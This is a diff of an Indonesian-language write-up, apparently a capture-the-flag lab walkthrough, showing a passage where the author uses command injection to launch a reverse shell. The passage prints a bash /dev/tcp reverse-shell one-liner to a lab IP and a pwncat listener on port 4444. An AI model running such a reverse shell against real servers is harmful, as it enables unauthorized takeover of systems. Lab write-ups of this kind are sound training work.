@@ -152,13 +152,14 @@ Pada awalnya saya menemukan kejanggalan saat meneliti form tersebut, disini saya
 
 Karena saya berhasil melakukan `Comand Injection` lalu tahap berikutnya saya akan melakukan `Reverse Shell` untuk mengambil alih web server tersebut
 
-```bash                                        I      
+```sh                                        I      
 #!/bin/bash
 bash -c 'bash -i >& /dev/tcp/10.10.14.30/4444 0>&1'
 ```
 > ini adalah script revershell yang saya gunakan
 
 Saya mendapatkan akses shell sebagai pengguna APP
+
 ```sh
 ┌[parrot]─[22:15-09/09]─[~]
 └╼k1r4$pwncat-cs -lp 4444
